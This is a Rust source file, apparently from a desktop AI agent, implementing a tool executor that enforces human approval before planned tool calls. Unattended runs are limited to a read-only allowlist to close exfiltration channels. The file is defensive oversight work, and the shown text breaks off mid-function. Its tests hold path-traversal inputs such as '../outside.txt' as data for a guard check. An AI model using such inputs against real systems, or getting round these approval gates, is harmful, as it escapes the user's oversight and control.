use super::*;
use crate::core::agent::ChangeTracker;
use crate::core::agi::executors::{ExecutorContext, ExecutorRegistry};
use crate::core::agi::planner::PlanStep;
use crate::core::llm::LLMRouter;
use crate::data::cache::ToolResultCache;
use crate::sys::account::{current_managed_auth_boundary, scope_managed_auth_boundary};
use crate::sys::commands::tool_confirmation::{
    enforce_agent_mode_gate, is_tool_remember_eligible, request_tool_confirmation,
    ToolConfirmationState,
};
use crate::sys::security::ToolExecutionGuard;
use crate::ui::events::tool_stream::{emit_tool_completed, emit_tool_error, emit_tool_started};
use anyhow::{anyhow, Result};
use std::collections::HashMap;
use std::sync::Arc;

const AGI_TOOL_CONFIRMATION_TIMEOUT_SECS: u64 = 120;

/// Ask the user before a planned tool call runs.
///
/// The autonomous loop plans from LLM output that untrusted content the agent
/// read can steer, so it must clear the same human-in-the-loop gate the chat
/// tool path clears in `core::llm::tool_executor::check_safety_tier_and_confirm`:
/// the app-managed [`ToolConfirmationState`], its agent-mode gate, its stored
/// choices, and its confirmation dialog. Fails closed when that state is not
/// managed, an unanswerable prompt is a refusal, not a pass.
///
/// Generic over the runtime so `tauri::test::mock_app()` can drive the gate.
pub(crate) async fn require_tool_approval<R: tauri::Runtime>(
    app_handle: &tauri::AppHandle<R>,
    tool_name: &str,
    parameters: &serde_json::Value,
    description: Option<&str>,
) -> Result<()> {
    use tauri::Manager;

    let Some(confirmation_state) = app_handle.try_state::<ToolConfirmationState>() else {
        tracing::error!(
            "[Executor] ToolConfirmationState unavailable, refusing '{}'",
            tool_name
        );
        return Err(anyhow!(
            "Cannot execute '{}': the approval service is unavailable.",
            tool_name
        ));
    };

    enforce_agent_mode_gate(app_handle, &confirmation_state, tool_name).map_err(|e| anyhow!(e))?;

    // `get_remembered_choice` returns `None` for everything on
    // `NEVER_REMEMBERABLE`, so a tool that is only as safe as the parameter
    // the planner wrote this time (terminal_execute, browser_execute_async_js)
    // reaches the dialog even if an older build persisted an "always allow".
    if let Some(approved) = confirmation_state.get_remembered_choice(tool_name) {
        return if approved {
            Ok(())
        } else {
            Err(anyhow!(
                "Tool '{}' is blocked by a stored denial policy. Change it in tool approval settings.",
                tool_name
            ))
        };
    }

    let tool_guard = confirmation_state.tool_guard();
    if !tool_guard.get_safety_tier(tool_name).requires_user_action() {
        return Ok(());
    }

    let request = tool_guard.create_confirmation_request(tool_name, parameters, description);

    tracing::info!(
        "[Executor] Requesting user confirmation for planned tool '{}'",
        tool_name
    );

    match request_tool_confirmation(
        app_handle,
        &confirmation_state,
        request,
        AGI_TOOL_CONFIRMATION_TIMEOUT_SECS,
    )
    .await
    {
        Ok(true) => Ok(()),
        Ok(false) => Err(anyhow!("You declined to run '{}'.", tool_name)),
        Err(e) => Err(anyhow!(
            "Couldn't get your confirmation for '{}': {}",
            tool_name,
            e
        )),
    }
}

/// Marks a goal that runs with no user at the app, such as a scheduled task.
pub const UNATTENDED_CONSTRAINT: &str = "unattended";

/// Opens every refusal of a tool that an unattended goal had nobody to ask
/// about. Whoever started the goal collects the refusals by this prefix.
pub const UNATTENDED_DENIAL_PREFIX: &str = "Not run unattended:";

pub fn unattended_constraint() -> Constraint {
    Constraint {
        name: UNATTENDED_CONSTRAINT.to_string(),
        value: ConstraintValue::Custom {
            key: UNATTENDED_CONSTRAINT.to_string(),
            value: true.to_string(),
        },
    }
}

fn goal_is_unattended(goal: &Goal) -> bool {
    goal.constraints
        .iter()
        .any(|constraint| match &constraint.value {
            ConstraintValue::Custom { key, value } => {
                key == UNATTENDED_CONSTRAINT && value == "true"
            }
            _ => false,
        })
}

/// Every tool a run nobody is watching may use with no stored allow. Each one
/// only reads this computer or a page the browser already has open: it writes
/// nothing, moves no input, and contacts no host. `llm_reason` and
/// `code_analyze` send text to the model the run is already planned by and to
/// nowhere else. A tool that fetches, searches, downloads, uploads, navigates
/// or writes is absent on purpose, because unattended it is an exfiltration
/// or tampering channel; it runs only on the user's stored "Always allow".
pub(crate) const UNATTENDED_READ_ONLY_TOOLS: &[&str] = &[
    "file_read",
    "file_read_binary",
    "file_list",
    "document_read",
    "document_extract_text",
    "document_get_metadata",
    "document_detect_type",
    "document_search",
    "grep_search",
    "glob_search",
    "code_search",
    "git_status",
    "git_diff",
    "git_log",
    "git_list_branches",
    "worktree_list",
    "undo_get_summary",
    "undo_get_changes",
    "coding_checkpoint_list",
    "memory_recall",
    "memory_search",
    "list_scheduled_tasks",
    "background_agent_get",
    "ui_screenshot",
    "ui_read_value",
    "image_ocr",
    "browser_get_text",
    "browser_get_attribute",
    "browser_get_element_state",
    "browser_get_url",
    "browser_get_title",
    "browser_wait_for_selector",
    "browser_wait_for_interactive",
    "browser_wait_for_navigation",
    "browser_extract",
    "browser_query_all",
    "browser_get_dom_snapshot",
    "browser_screenshot",
    "llm_reason",
    "code_analyze",
];

/// Being on the list is necessary, not sufficient: a tool the guard later
/// raises to an approval tier stops running unattended without a list edit.
pub(crate) fn runs_unattended_without_an_allow(
    guard: &ToolExecutionGuard,
    tool_name: &str,
) -> bool {
    UNATTENDED_READ_ONLY_TOOLS.contains(&tool_name)
        && !guard.get_safety_tier(tool_name).requires_user_action()
}

/// The approval gate for a goal nobody is watching.
///
/// It runs the same mode gate and honours the same stored per-tool choices as
/// [`require_tool_approval`], but never opens the dialog: a tool outside
/// [`UNATTENDED_READ_ONLY_TOOLS`] is refused at once and by name. A session
/// approval or the auto-approve switch does not stand in, because both were
/// given to a person who was there to see what ran.
pub(crate) fn unattended_tool_approval<R: tauri::Runtime>(
    app_handle: &tauri::AppHandle<R>,
    tool_name: &str,
) -> Result<()> {
    use tauri::Manager;

    // A capability switched off holds wherever the assistant acts, before any
    // stored allow is consulted: "Terminal: off" outranks "always allow".
    if let Some(off) =
        crate::sys::commands::capabilities::capability_refusal_now(app_handle, tool_name)
    {
        return Err(anyhow!("{UNATTENDED_DENIAL_PREFIX} {off}"));
    }

    let Some(confirmation_state) = app_handle.try_state::<ToolConfirmationState>() else {
        return Err(anyhow!(
            "{UNATTENDED_DENIAL_PREFIX} '{tool_name}' was refused because the approval service is unavailable."
        ));
    };

    enforce_agent_mode_gate(app_handle, &confirmation_state, tool_name)
        .map_err(|blocked| anyhow!("{UNATTENDED_DENIAL_PREFIX} {blocked}"))?;

    match confirmation_state.get_remembered_choice(tool_name) {
        Some(true) => return Ok(()),
        Some(false) => {
            return Err(anyhow!(
                "{UNATTENDED_DENIAL_PREFIX} '{tool_name}' is blocked by a stored denial policy. Change it in tool approval settings."
            ))
        }
        None => {}
    }

    if runs_unattended_without_an_allow(confirmation_state.tool_guard(), tool_name) {
        return Ok(());
    }

    let remedy = if is_tool_remember_eligible(tool_name) {
        "Run it from chat, or save an 'Always allow' for this tool in Settings."
    } else {
        "This tool is asked about every time, so run it from chat."
    };
    Err(anyhow!(
        "{UNATTENDED_DENIAL_PREFIX} '{tool_name}' needs your approval, and nobody was here to give it. {remedy}"
    ))
}

/// The AGI Executor handles tool execution with security validation,
/// caching, and integration with the modular executor architecture.
///
/// # Architecture
///
/// The executor delegates tool calls to specialized executors via the
/// `ExecutorRegistry`. Each executor handles a category of tools:
///
/// - `FileExecutor`: file_read, file_write, file_delete
/// - `UiExecutor`: ui_screenshot, ui_click, ui_type
/// - `BrowserExecutor`: browser_navigate, browser_click, browser_extract
/// - `DatabaseExecutor`: db_query, db_execute, db_transaction_*
/// - `GitExecutor`: git_status, git_init, git_add, git_commit, git_push, git_clone
/// - `CloudExecutor`: cloud_upload, cloud_download
/// - `SearchExecutor`: search_web
/// - `TerminalExecutor`: terminal_execute
/// - `CodeExecutor`: code_execute, code_analyze
/// - `ApiExecutor`: api_call, api_upload, api_download
/// - `LlmExecutor`: llm_reason
/// - `ProductivityExecutor`: productivity_*, document_*
///
/// # Security
///
/// All tool calls pass through the `ToolExecutionGuard` for security validation
/// before execution. Path-based operations validate against allowed directories.
///
/// # Caching
///
/// Tool results are cached via `ToolResultCache` to avoid redundant executions.
/// Cache invalidation occurs automatically when dependent data changes.
pub struct AGIExecutor {
    tool_registry: Arc<ToolRegistry>,
    _resource_manager: Arc<ResourceManager>,
    router: Arc<tokio::sync::RwLock<LLMRouter>>,
    app_handle: Option<tauri::AppHandle>,
    tool_cache: Arc<ToolResultCache>,
    security_guard: Arc<ToolExecutionGuard>,
    change_tracker: Option<Arc<ChangeTracker>>,
    executor_registry: ExecutorRegistry,
}

/// The folder a run's relative paths are read against: the project the
/// person opened. Without one a relative path stays relative and the guard
/// refuses it.
pub(crate) async fn run_project_folder(
    app_handle: Option<&tauri::AppHandle>,
) -> Option<std::path::PathBuf> {
    use tauri::Manager;

    let project =
        app_handle?.try_state::<crate::sys::commands::project_context::ProjectContextState>()?;
    project.get_folder().await.map(std::path::PathBuf::from)
}

/// A planned call with its path arguments made absolute, once, before the
/// approval, the cache, the hook, the guard and the tool read it.
fn in_project_folder(
    tool_name: &str,
    parameters: &HashMap<String, serde_json::Value>,
    project_folder: Option<&std::path::Path>,
) -> HashMap<String, serde_json::Value> {
    let mut resolved = parameters.clone();
    ToolExecutionGuard::resolve_path_arguments(tool_name, &mut resolved, project_folder);
    resolved
}

impl AGIExecutor {
    /// Creates a new AGIExecutor with default settings.
    ///
    /// # Arguments
    ///
    /// * `tool_registry` - Registry of available AGI tools
    /// * `resource_manager` - Manager for resource limits
    /// * `router` - LLM router for reasoning operations
    /// * `app_handle` - Optional Tauri app handle for UI events
    /// * `change_tracker` - Optional tracker for undo capability
    pub fn new(
        tool_registry: Arc<ToolRegistry>,
        resource_manager: Arc<ResourceManager>,
        router: Arc<tokio::sync::RwLock<LLMRouter>>,
        app_handle: Option<tauri::AppHandle>,
        change_tracker: Option<Arc<ChangeTracker>>,
    ) -> Result<Self> {
        let executor_registry = ExecutorRegistry::new(router.clone());

        Ok(Self {
            tool_registry,
            _resource_manager: resource_manager,
            router,
            app_handle,
            tool_cache: Arc::new(ToolResultCache::new()),
            security_guard: Arc::new(ToolExecutionGuard::new()),
            change_tracker,
            executor_registry,
        })
    }

    /// Creates an AGIExecutor with a custom cache capacity.
    ///
    /// # Arguments
    ///
    /// * `cache_size_bytes` - Maximum cache size in bytes
    pub fn with_cache_capacity(
        tool_registry: Arc<ToolRegistry>,
        resource_manager: Arc<ResourceManager>,
        router: Arc<tokio::sync::RwLock<LLMRouter>>,
        app_handle: Option<tauri::AppHandle>,
        cache_size_bytes: usize,
        change_tracker: Option<Arc<ChangeTracker>>,
    ) -> Result<Self> {
        let executor_registry = ExecutorRegistry::new(router.clone());

        Ok(Self {
            tool_registry,
            _resource_manager: resource_manager,
            router,
            app_handle,
            tool_cache: Arc::new(ToolResultCache::with_capacity(cache_size_bytes)),
            security_guard: Arc::new(ToolExecutionGuard::new()),
            change_tracker,
            executor_registry,
        })
    }

    /// Returns cache statistics for monitoring.
    pub fn get_cache_stats(&self) -> crate::data::cache::ToolCacheStats {
        self.tool_cache.get_stats()
    }

    /// Clears all cached tool results.
    pub fn clear_cache(&self) -> Result<()> {
        self.tool_cache.clear()
    }

    /// Removes expired entries from the cache.
    ///
    /// Returns the number of entries pruned.
    pub fn prune_cache(&self) -> Result<usize> {
        self.tool_cache.prune_expired()
    }

    /// Normalizes a step ID, generating a UUID if empty.
    fn normalized_step_id(step_id: &str) -> String {
        if step_id.trim().is_empty() {
            uuid::Uuid::new_v4().to_string()
        } else {
            step_id.to_string()
        }
    }

    /// Executes a single plan step.
    ///
    /// This method:
    /// 1. Validates all dependencies are satisfied
    /// 2. Looks up the tool in the registry
    /// 3. Executes the tool with the step's parameters
    /// 4. Emits events for UI updates
    ///
    /// # Arguments
    ///
    /// * `step` - The plan step to execute
    /// * `context` - The execution context with goal and state information
    pub async fn execute_step(
        &self,
        step: &PlanStep,
        context: &ExecutionContext,
    ) -> Result<serde_json::Value> {
        tracing::info!("[Executor] Executing step: {}", step.description);

        let session_id = uuid::Uuid::new_v4().to_string();
        let normalized_step_id = Self::normalized_step_id(&step.id);

        // Emit step start event
        crate::ui::hooks::emit_event(crate::ui::hooks::HookEvent::step_start(
            session_id.clone(),
            normalized_step_id.clone(),
            step.description.clone(),
            context.goal.id.clone(),
        ))
        .await;

        // Look up the tool
        let tool = self
            .tool_registry
            .get_tool(&step.tool_id)
            .ok_or_else(|| anyhow::anyhow!("Tool {} not found", step.tool_id))?;

        // Validate dependencies
        for dep_id in &step.dependencies {
            let dep_result = context.tool_results.iter().find(|r| r.step_id == *dep_id);

            if let Some(result) = dep_result {
                if !result.success {
                    return Err(anyhow::anyhow!("Dependency {} failed", dep_id));
                }
            } else {
                return Err(anyhow::anyhow!("Dependency {} not found", dep_id));
            }
        }

        // Execute the tool
        let result = match self.execute_tool(&tool, &step.parameters, context).await {
            Ok(res) => {
                crate::ui::hooks::emit_event(crate::ui::hooks::HookEvent::step_completed(
                    session_id,
                    normalized_step_id.clone(),
                    step.description.clone(),
                    context.goal.id.clone(),
                    res.clone(),
                ))
                .await;
                Ok(res)
            }
            Err(e) => {
                crate::ui::hooks::emit_event(crate::ui::hooks::HookEvent::step_error(
                    session_id,
                    normalized_step_id,
                    step.description.clone(),
                    context.goal.id.clone(),
                    e.to_string(),
                ))
                .await;
                Err(e)
            }
        }?;

        Ok(result)
    }

    /// Executes a tool with caching support.
    ///
    /// Checks the cache first and returns cached results if available.
    /// Otherwise executes the tool and caches the result.
    async fn execute_tool(
        &self,
        tool: &Tool,
        parameters: &HashMap<String, serde_json::Value>,
        context: &ExecutionContext,
    ) -> Result<serde_json::Value> {
        let tool_name = tool.id.as_str();

        let project_folder = run_project_folder(self.app_handle.as_ref()).await;
        let parameters = &in_project_folder(tool_name, parameters, project_folder.as_deref());

        // Approval precedes the cache lookup: a cached result must not let a
        // later, unapproved call inherit an earlier approval.
        self.ensure_tool_approved(tool_name, parameters, &context.goal)
            .await?;

        // Check cache first
        if let Some(cached_result) = self.tool_cache.get(tool_name, parameters) {
            tracing::info!(
                "[Executor] Using cached result for tool '{}' (cache hit)",
                tool_name
            );
            return Ok(cached_result);
        }

        // Execute the tool
        let result = self
            .execute_tool_impl(tool_name, parameters, context)
            .await?;

        // Cache the result
        if let Err(e) = self.tool_cache.set(tool_name, parameters, result.clone()) {
            tracing::warn!(
                "[Executor] Failed to cache result for tool '{}': {}",
                tool_name,
                e
            );
        }

        Ok(result)
    }

    /// Run the human-approval gate for a planned tool call.
    ///
    /// Without an app handle, or for a goal marked unattended, there is no one
    /// to ask, so every tool whose safety tier needs a human decision is
    /// refused rather than run.
    async fn ensure_tool_approved(
        &self,
        tool_name: &str,
        parameters: &HashMap<String, serde_json::Value>,
        goal: &Goal,
    ) -> Result<()> {
        let Some(ref app_handle) = self.app_handle else {
            if !runs_unattended_without_an_allow(&self.security_guard, tool_name) {
                tracing::error!(
                    "[Executor] No app handle to request approval, refusing '{}'",
                    tool_name
                );
                return Err(anyhow!(
                    "Cannot execute '{}': approval cannot be requested without a user session.",
                    tool_name
                ));
            }
            return Ok(());
        };

        if goal_is_unattended(goal) {
            return unattended_tool_approval(app_handle, tool_name);
        }

        // Before the approval prompt and the cache, so a capability that is
        // off neither asks the person nor answers from an earlier result.
        if let Some(off) =
            crate::sys::commands::capabilities::capability_refusal(app_handle, tool_name).await
        {
            return Err(anyhow!(off));
        }

        let params_json = serde_json::to_value(parameters)?;
        let description = self
            .tool_registry
            .get_tool(tool_name)
            .map(|t| t.description);

        require_tool_approval(app_handle, tool_name, &params_json, description.as_deref()).await
    }

    /// Core tool execution implementation.
    ///
    /// This method:
    /// 1. Validates security constraints
    /// 2. Delegates to the appropriate executor via ExecutorRegistry
    /// 3. Falls back to legacy implementation for unmigrated tools
    /// 4. Emits tool stream events for UI feedback
    async fn execute_tool_impl(
        &self,
        tool_name: &str,
        parameters: &HashMap<String, serde_json::Value>,
        context: &ExecutionContext,
    ) -> Result<serde_json::Value> {
        let session_id = uuid::Uuid::new_v4().to_string();
        let tool_id = format!("{}_{}", tool_name, &session_id[..8]); // utf8-safe: uuid hex
        let start_time = std::time::Instant::now();

        // Emit tool stream started event
        if let Some(ref app_handle) = self.app_handle {
            emit_tool_started(
                app_handle,
                &tool_id,
                tool_name,
                Some(serde_json::to_value(parameters).unwrap_or_default()),
            );
        }

        // A pre-tool-use hook can refuse the call before anything runs.
        let refusal = crate::ui::hooks::gate_event(crate::ui::hooks::HookEvent::pre_tool_use(
            session_id.clone(),
            tool_name.to_string(),
            tool_name.to_string(),
            parameters.clone(),
        ))
        .await;
        if let Some(reason) = refusal {
            let message = format!("A PreToolUse hook blocked this tool: {reason}");
            if let Some(ref app_handle) = self.app_handle {
                emit_tool_error(
                    app_handle,
                    &tool_id,
                    &message,
                    start_time.elapsed().as_millis() as u64,
                    false,
                );
            }
            crate::ui::hooks::emit_event(crate::ui::hooks::HookEvent::tool_error(
                session_id,
                tool_name.to_string(),
                tool_name.to_string(),
                parameters.clone(),
                message.clone(),
            ))
            .await;
            return Err(anyhow::anyhow!(message));
        }

        // Security validation, through the app-managed guard when there is
        // one, so rate limits and allowed paths are shared with the chat tool
        // path instead of being counted twice against two private guards.
        let params_json = serde_json::to_value(parameters)?;
        let validation = {
            use tauri::Manager;

            let managed_guard = self
                .app_handle
                .as_ref()
                .and_then(|handle| handle.try_state::<ToolConfirmationState>());

            match managed_guard {
                Some(state) => {
                    state
                        .tool_guard()
                        .validate_tool_call(tool_name, &params_json)
                        .await
                }
                None => {
                    self.security_guard
                        .validate_tool_call(tool_name, &params_json)
                        .await
                }
            }
        };

        if let Err(e) = validation {
            tracing::error!(
                "[Executor] Security validation failed for tool '{}': {}",
                tool_name,
                e
            );

            // Emit tool stream error event
            if let Some(ref app_handle) = self.app_handle {
                emit_tool_error(
                    app_handle,
                    &tool_id,
                    &format!("Security validation failed: {}", e),
                    start_time.elapsed().as_millis() as u64,
                    false,
                );
            }

            crate::ui::hooks::emit_event(crate::ui::hooks::HookEvent::tool_error(
                session_id,
                tool_name.to_string(),
                tool_name.to_string(),
                parameters.clone(),
                format!("Security validation failed: {}", e),
            ))
            .await;
            return Err(anyhow::anyhow!("Security validation failed: {}", e));
        }

        tracing::debug!(
            "[Executor] Security validation passed for tool '{}'",
            tool_name
        );

        // Try to execute via the executor registry first
        let result = if let Some(executor) = self.executor_registry.get_executor(tool_name) {
            let exec_context = ExecutorContext {
                app_handle: self.app_handle.clone(),
                router: self.router.clone(),
                tool_cache: self.tool_cache.clone(),
                security_guard: self.security_guard.clone(),
                change_tracker: self.change_tracker.clone(),
                session_id: session_id.clone(),
                tool_id: tool_id.clone(),
                granted_directories: Vec::new(),
            };

            executor
                .execute(tool_name, parameters, &exec_context, context)
                .await
        } else {
            // Bug #31: warn when no executor is found so silent fallthrough
            // is impossible to miss in logs.
            tracing::warn!(
                "[Executor] No executor registered for tool '{}'. Falling back to \
                 fallback handler. If this tool should be handled, register it in \
                 the appropriate executor's tool_names(). Session: {}",
                tool_name,
                session_id
            );
            self.execute_fallback_tool(tool_name, parameters, &session_id, &tool_id)
                .await
        };

        let execution_time_ms = start_time.elapsed().as_millis() as u64;

        // Emit tool stream completed/error event
        if let Some(ref app_handle) = self.app_handle {
            match &result {
                Ok(res) => {
                    emit_tool_completed(app_handle, &tool_id, res.clone(), execution_time_ms);
                }
                Err(e) => {
                    emit_tool_error(
                        app_handle,
                        &tool_id,
                        &e.to_string(),
                        execution_time_ms,
                        true,
                    );
                }
            }
        }

        // Emit post-tool-use hooks
        match &result {
            Ok(res) => {
                crate::ui::hooks::emit_event(crate::ui::hooks::HookEvent::post_tool_use(
                    session_id.clone(),
                    tool_name.to_string(),
                    tool_name.to_string(),
                    parameters.clone(),
                    res.clone(),
                    execution_time_ms,
                ))
                .await;
            }
            Err(e) => {
                crate::ui::hooks::emit_event(crate::ui::hooks::HookEvent::tool_error(
                    session_id.clone(),
                    tool_name.to_string(),
                    tool_name.to_string(),
                    parameters.clone(),
                    e.to_string(),
                ))
                .await;
            }
        }

        // Emit tool execution event for UI
        if let Some(ref app_handle) = self.app_handle {
            let tool_execution = crate::ui::events::create_tool_execution_event(
                tool_name,
                parameters,
                result.as_ref().ok().cloned(),
                result.as_ref().err().map(|e| e.to_string()),
                execution_time_ms,
                result.is_ok(),
            );
            crate::ui::events::emit_tool_execution(app_handle, tool_execution);
        }

        result
    }

    /// Fallback execution for tools not yet migrated to the ExecutorRegistry.
    ///
    /// This handles tools that require special handling or haven't been
    /// extracted into their own executor modules yet.
    async fn execute_fallback_tool(
        &self,
        tool_name: &str,
        _parameters: &HashMap<String, serde_json::Value>,
        session_id: &str,
        _tool_id: &str,
    ) -> Result<serde_json::Value> {
        match tool_name {
            // MCP tool calls are handled separately via the MCP client
            tool if tool.starts_with("mcp__") => Err(anyhow!(
                "MCP tool '{}' should be executed via the MCP client, not the AGI executor",
                tool_name
            )),

            // Common file operation aliases, redirect to the registered FileExecutor
            "read_file" | "read" | "file_read" | "open_file" => {
                tracing::info!(
                    "[Executor] Tool '{}' is a file operation alias. Use 'file_read' via the \
                    ExecutorRegistry. Session: {}",
                    tool_name,
                    session_id
                );
                Err(anyhow!(
                    "Tool '{}' should be invoked as 'file_read' (handled by FileExecutor). \
                    Registered file tools: file_read, file_write.",
                    tool_name
                ))
            }

            "write_file" | "write" | "file_write" | "save_file" | "create_file" => {
                tracing::info!(
                    "[Executor] Tool '{}' is a file operation alias. Use 'file_write' via the \
                    ExecutorRegistry. Session: {}",
                    tool_name,
                    session_id
                );
                Err(anyhow!(
                    "Tool '{}' should be invoked as 'file_write' (handled by FileExecutor). \
                    Registered file tools: file_read, file_write.",
                    tool_name
                ))
            }

            // Common shell/terminal aliases, redirect to the registered TerminalExecutor
            "shell_execute" | "shell" | "bash" | "run_command" | "exec" | "terminal" => {
                tracing::info!(
                    "[Executor] Tool '{}' is a terminal alias. Use 'terminal_execute' via the \
                    ExecutorRegistry. Session: {}",
                    tool_name,
                    session_id
                );
                Err(anyhow!(
                    "Tool '{}' should be invoked as 'terminal_execute' (handled by TerminalExecutor).",
                    tool_name
                ))
            }

            // Common code analysis aliases, redirect to the registered CodeExecutor
            "analyze_code" | "code_analysis" | "lint" => {
                tracing::info!(
                    "[Executor] Tool '{}' is a code analysis alias. Use 'code_analyze' via the \
                    ExecutorRegistry. Session: {}",
                    tool_name,
                    session_id
                );
                Err(anyhow!(
                    "Tool '{}' should be invoked as 'code_analyze' or 'code_execute' \
                    (handled by CodeExecutor).",
                    tool_name
                ))
            }

            // Common web/API aliases, redirect to the registered ApiExecutor
            "http_request" | "fetch" | "web_request" | "api_request" => {
                tracing::info!(
                    "[Executor] Tool '{}' is an API alias. Use 'api_call' via the \
                    ExecutorRegistry. Session: {}",
                    tool_name,
                    session_id
                );
                Err(anyhow!(
                    "Tool '{}' should be invoked as 'api_call' (handled by ApiExecutor). \
                    Registered API tools: api_call, api_upload, api_download.",
                    tool_name
                ))
            }

            _ => {
                // Bug #31 fix: Log at error level (not warn) so this configuration mismatch
                // is impossible to miss. Tools registered in ToolRegistry but not in
                // ExecutorRegistry silently fall through to here.
                tracing::error!(
                    "[Executor] Tool '{}' not found in ExecutorRegistry or fallback handlers. \
                    This tool may be registered in ToolRegistry (tools/mod.rs) but lacks an \
                    executor implementation. Session: {}",
                    tool_name,
                    session_id
                );
                Err(anyhow!(
                    "Unknown tool: '{}'. Available tool families: file_read/file_write (FileExecutor), \
                    terminal_execute (TerminalExecutor), code_execute/code_analyze (CodeExecutor), \
                    api_call (ApiExecutor), llm_reason (LlmExecutor), productivity_*/document_* \
                    (ProductivityExecutor). MCP tools must use the 'mcp__' prefix.",
                    tool_name
                ))
            }
        }
    }

    /// Executes multiple plans in parallel.
    ///
    /// Each plan runs in its own sandbox for isolation.
    ///
    /// # Arguments
    ///
    /// * `plans` - Vector of plans to execute
    /// * `sandbox_manager` - Manager for creating isolated sandboxes
    /// * `goal` - The goal being pursued
    pub async fn execute_plans_parallel(
        &self,
        plans: Vec<planner::Plan>,
        sandbox_manager: &crate::core::agi::SandboxManager,
        goal: &Goal,
    ) -> Result<Vec<crate::core::agi::ExecutionResult>> {
        use tokio::time::Instant;

        tracing::info!(
            "[Executor] Starting parallel execution of {} plans",
            plans.len()
        );

        let mut handles = Vec::new();
        let managed_auth_boundary = current_managed_auth_boundary();

        for plan in plans {
            let tool_registry = self.tool_registry.clone();
            let router = self.router.clone();
            let tool_cache = self.tool_cache.clone();

            let sandbox = sandbox_manager.create_sandbox(false).await?;
            let sandbox_id = sandbox.id.clone();
            let plan_id = plan.goal_id.clone();
            let goal_clone = goal.clone();

            let app_handle = self.app_handle.clone();

            let handle = tokio::spawn(scope_managed_auth_boundary(
                managed_auth_boundary.clone(),
                async move {
                    let start_time = Instant::now();

                    let context = ExecutionContext {
                        goal: goal_clone,
                        current_state: HashMap::new(),
                        available_resources: ResourceState {
                            cpu_usage_percent: 0.0,
                            memory_usage_mb: 0,
                            network_usage_mbps: 0.0,
                            storage_usage_mb: 0,
                            available_tools: vec![],
                        },
                        tool_results: Vec::new(),
                        context_memory: Vec::new(),
                    };

                    let resource_manager = match ResourceManager::new(ResourceLimits {
                        cpu_percent: 80.0,
                        memory_mb: 2048,
                        network_mbps: 100.0,
                        storage_mb: 10240,
                    }) {
                        Ok(rm) => rm,
                        Err(e) => {
                            tracing::error!("[Executor] Failed to create ResourceManager: {}", e);
                            return crate::core::agi::ExecutionResult {
                                plan_id,
                                sandbox_id,
                                success: false,
                                steps_completed: 0,
                                steps_failed: 1,
                                output: serde_json::json!({}),
                                error: Some(format!("Failed to create ResourceManager: {}", e)),
                                execution_time_ms: start_time.elapsed().as_millis() as u64,
                                cost: None,
                            };
                        }
                    };

                    let mut executor = match AGIExecutor::new(
                        tool_registry,
                        Arc::new(resource_manager),
                        router.clone(),
                        app_handle,
                        None, // No change tracker for parallel execution
                    ) {
                        Ok(ex) => ex,
                        Err(e) => {
                            tracing::error!("[Executor] Failed to create AGIExecutor: {}", e);
                            return crate::core::agi::ExecutionResult {
                                plan_id,
                                sandbox_id,
                                success: false,
                                steps_completed: 0,
                                steps_failed: 1,
                                output: serde_json::json!({}),
                                error: Some(format!("Failed to create AGIExecutor: {}", e)),
                                execution_time_ms: start_time.elapsed().as_millis() as u64,
                                cost: None,
                            };
                        }
                    };

                    executor.tool_cache = tool_cache;

                    let mut steps_completed = 0;
                    let mut steps_failed = 0;
                    let mut output = serde_json::json!({});
                    let mut error_msg = None;

                    for step in &plan.steps {
                        match executor.execute_step(step, &context).await {
                            Ok(result) => {
                                steps_completed += 1;
                                output = result;
                            }
                            Err(e) => {
                                steps_failed += 1;
                                error_msg = Some(e.to_string());
                                break;
                            }
                        }
                    }

                    let execution_time_ms = start_time.elapsed().as_millis() as u64;
                    let success = steps_failed == 0 && steps_completed > 0;

                    crate::core::agi::ExecutionResult {
                        plan_id,
                        sandbox_id,
                        success,
                        output,
                        execution_time_ms,
                        steps_completed,
                        steps_failed,
                        error: error_msg,
                        cost: None,
                    }
                },
            ));

            handles.push(handle);
        }

        let results = futures::future::join_all(handles).await;

        let execution_results: Vec<crate::core::agi::ExecutionResult> =
            results.into_iter().filter_map(|r| r.ok()).collect();

        tracing::info!(
            "[Executor] Parallel execution complete. {} results collected",
            execution_results.len()
        );

        Ok(execution_results)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn a_relative_path_in_a_goal_step_is_resolved_inside_the_project_before_any_gate() {
        let project = tempfile::tempdir().expect("tempdir");
        let guard = ToolExecutionGuard::new();
        let call = |path: &str| HashMap::from([("path".to_string(), serde_json::json!(path))]);

        let stated = call("src/a.ts");
        assert!(
            guard
                .validate_before_folder_consent("file_read", &serde_json::json!(stated))
                .await
                .is_err(),
            "the guard never guesses what a relative path is relative to"
        );

        let resolved = in_project_folder("file_read", &stated, Some(project.path()));
        assert_eq!(
            resolved["path"],
            serde_json::json!(project.path().join("src/a.ts").to_string_lossy())
        );
        guard
            .validate_before_folder_consent("file_read", &serde_json::json!(resolved))
            .await
            .expect("the path the tool will open passes the guard");

        for escaping in ["../outside.txt", "src/../../outside.txt"] {
            let resolved = in_project_folder("file_write", &call(escaping), Some(project.path()));
            assert!(
                matches!(
                    guard
                        .validate_tool_call("file_write", &serde_json::json!(resolved))
                        .await,
                    Err(crate::sys::security::tool_guard::SecurityError::PathTraversal(_))
                ),
                "{escaping} leaves the project"
            );
        }

        let edits = HashMap::from([(
            "edits".to_string(),
            serde_json::json!([{ "path": "src/a.ts", "old_text": "a", "new_text": "b" }]),
        )]);
        let resolved = in_project_folder("multi_edit", &edits, Some(project.path()));
        assert_eq!(
            resolved["edits"][0]["path"],
            serde_json::json!(project.path().join("src/a.ts").to_string_lossy())
        );

        assert_eq!(
            in_project_folder("file_read", &stated, None),
            stated,
            "with no project open the path is left for the guard to refuse"
        );
        assert_eq!(run_project_folder(None).await, None);
    }

    #[test]
    fn test_normalized_step_id_empty() {
        let result = AGIExecutor::normalized_step_id("");
        assert!(!result.is_empty());
        // Should be a valid UUID
        assert!(uuid::Uuid::parse_str(&result).is_ok());
    }

    #[test]
    fn test_normalized_step_id_whitespace() {
        let result = AGIExecutor::normalized_step_id("   ");
        assert!(!result.is_empty());
        // Should be a valid UUID
        assert!(uuid::Uuid::parse_str(&result).is_ok());
    }

    #[test]
    fn test_normalized_step_id_valid() {
        let result = AGIExecutor::normalized_step_id("step_1");
        assert_eq!(result, "step_1");
    }

    // CLAUDE-SECURITY F4, the autonomous loop dispatched every planned tool
    // call, including terminal/file/db/email/deploy actions, with no human
    // decision anywhere between the planner's JSON and the executor.
    mod approval_gate {
        use super::*;
        use crate::sys::commands::tool_confirmation::AgentMode;
        use serde_json::json;

        fn managed_app(mode: AgentMode) -> tauri::App<tauri::test::MockRuntime> {
